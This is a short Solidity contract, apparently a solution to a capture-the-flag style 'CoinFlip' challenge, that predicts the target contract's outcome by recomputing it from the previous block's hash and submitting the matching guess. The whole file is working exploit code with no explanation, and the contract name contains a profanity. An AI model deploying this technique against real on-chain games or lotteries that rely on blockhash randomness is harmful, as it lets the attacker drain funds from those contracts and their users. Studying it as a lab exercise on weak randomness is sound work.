pragma solidity >=0.8.2 <0.9.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
contract CoinFlipFucker {
    address public coinFlip;
    constructor(address _coinFlip) {
        coinFlip = _coinFlip;
    }
    function play() external {
        ICoinFlip(coinFlip).flip(
                uint256(blockhash(block.number - 1)) / 
                57896044618658097711785492504343953926634992332820282019728792003956564819968
             == 1
        );
    }
}
